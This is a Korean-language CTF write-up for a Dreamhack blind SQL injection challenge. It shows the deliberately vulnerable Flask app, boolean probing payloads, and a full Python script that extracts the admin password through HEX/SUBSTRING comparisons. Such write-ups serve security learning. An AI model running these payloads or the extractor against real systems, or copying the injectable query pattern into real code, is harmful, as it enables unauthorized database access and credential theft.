---
title: "Blind SQLI advanced  tier 2"
summary: "Blind SQLI CTF writeup."
date: "2026-04-10"
category: "ctf"
section: "security"
badge: "CTF / Wargame"
badgeTone: "ctf"
tags:
  - ctf
  - web
  - SQLI
statLabel: "tier"
statValue: "2"
heroEyebrow: "$ cat content/posts/blind-sqli-ad.md"
heroAvatar: "CTF"
---

# Blind sql injection advanced / tier 2

## 문제 개요

- 챌린지 유형: Web / Blind SQLI
- 목표: Blind sql injection 통해  admin 계정 탈취하는 문제 

## 분석 과정
```python
import os
from flask import Flask, request, render_template_string
from flask_mysqldb import MySQL

app = Flask(__name__)
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST', 'localhost')
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER', 'user')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD', 'pass')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB', 'user_db')
mysql = MySQL(app)

template ='''
<pre style="font-size:200%">SELECT * FROM users WHERE uid='{{uid}}';</pre><hr/>
<form>
    <input tyupe='text' name='uid' placeholder='uid'>
    <input type='submit' value='submit'>
</form>
{% if nrows == 1%}
    <pre style="font-size:150%">user "{{uid}}" exists.</pre>
{% endif %}
'''

@app.route('/', methods=['GET'])
def index():
    uid = request.args.get('uid', '')
    nrows = 0

    if uid:
        cur = mysql.connection.cursor()
        nrows = cur.execute(f"SELECT * FROM users WHERE uid='{uid}';")

    return render_template_string(template, uid=uid, nrows=nrows)


if __name__ == '__main__':
    app.run(host='0.0.0.0')
```
- SELECT * FROM users WHERE uid='{uid}’ 구문으로 계정이 존재하는지 확인하는 기능이 존재
- 해당 코드는 사용자 입력이 그대로 받아 쿼리에 삽입되어 서버에 요청 보냄 sql injection  취약점 존재
- 해당 서버는 조회 결과가 참일 때만 문자열을 화면에 보여줌 그러므로 blind sql injection 으로 admin 계정의 패스워드를 하나하나 추출해내야 함
![step1](/images/BlindSQLI.png)
![step1](/images/BlindSQLI2.png)
- ‘ # 과 admin’ #을 보낸 결과를 보아 주석이 통하고 조회 결과가 참일 경우  exists라고 화면에 띄워줌
- 이를 통해 substring을 통한 추출 쿼리 생성
- admin' and substring(upw,1,1)=’D’# → 테스트를 위해 플래그 형식에 맞는 구문을 넣었을 경우 참으로 결과가 나옴
- admin' and substring(upw,1,1)=’A’# → 화면에 아무것도 안나옴 = 거짓
⇒ 구문이 잘 작동하는 것을 알 수 있음
- 하지만 플래그가 한글로 되어있다는 문제 내용이 있음 한글은 ASCII로 표현이 안되기 때문에
- HEX 함수를 이용한 16진수 우회 추출 방법으로 구문 작성 후 자동화 코드 작성
```sql
admin' AND SUBSTRING(HEX(SUBSTRING(upw, {char_pos}, 1)), {hex_pos}, 1)='{guess_char}'
```

```python
@app.route("/vuln")
def vuln():
    param = request.args.get("param", "")
    return param
```
### 최종 페이로드

```python
import requests
import binascii

TARGET_URL = "http://host3.dreamhack.games:16271/"
MAX_LENGTH = 50

def extract_flag_hex():
    extracted_flag = ""
    print("[*] Hex 변환 기반 플래그 추출 시작...")

    # 1. 원본 문자열의 자리 이동 (1번째 글자, 2번째 글자...)
    for char_pos in range(1, MAX_LENGTH + 1):
        hex_string = ""
        
        # 2. 16진수로 변환된 문자열의 자리 이동 (한글은 보통 UTF-8에서 6자리 Hex로 표현됨)
        # 넉넉하게 1부터 6까지 돌립니다. (영문/숫자는 2자리에서 끝남)
        for hex_pos in range(1, 7):
            found_hex_char = False
            
            # 3. 16진수 문자 범위(0~9, A~F) 대입
            hex_chars = "0123456789ABCDEF"
            for guess_char in hex_chars:
                
                # 💡 HEX로 감싼 뒤 SUBSTRING으로 16진수의 한 자리를 비교합니다.
                payload = f"admin' AND SUBSTRING(HEX(SUBSTRING(upw, {char_pos}, 1)), {hex_pos}, 1)='{guess_char}' #"
                
                try:
                    response = requests.get(TARGET_URL, params={'uid': payload})
                    
                    if "exists" in response.text:
                        hex_string += guess_char
                        found_hex_char = True
                        break # 현재 16진수 자리(hex_pos)를 찾았으니 다음 자리로
                        
                except requests.exceptions.RequestException as e:
                    print(f"[!] 에러: {e}")
                    return
            
            # 0~9, A~F를 다 돌았는데도 없으면 이 문자(char_pos)의 Hex 추출이 끝난 것
            if not found_hex_char:
                break
        
        # 추출된 hex_string이 없으면 전체 플래그가 끝난 것
        if not hex_string:
            break
            
        print(f"[*] {char_pos}번째 글자의 Hex 값: {hex_string}")
        
        # 4. 추출한 16진수 문자열을 다시 원래 문자로 디코딩
        try:
            # 예: "EAB080" -> b'\xea\xb0\x80' -> "안"
            decoded_char = binascii.unhexlify(hex_string).decode('utf-8')
            extracted_flag += decoded_char
            print(f"[+] 찾은 글자: {decoded_char} | 현재까지 플래그: {extracted_flag}")
        except Exception as e:
            print(f"[-] 디코딩 에러 (잘못된 Hex 값): {hex_string}")

    print(f"\n[🏆] 최종 추출된 플래그: {extracted_flag}")

extract_flag_hex()
```

- HEX 함수를 이용한 16진수 우회 추출 방법으로
```text
한글은 보통 UTF-8에서 6자리 Hex로 표현
(SUBSTRING(upw, {char_pos}, 1) 헤딩 구문의 답으로 '이'로 나온다 하면 '이'의 HEX() 함수 통해 16진수로 변환하여 UUU111 이러한 형식으로 나타남
```
- SUBSTRING을 통해 해당 16진수를 비교하여 플래그 추출 

W
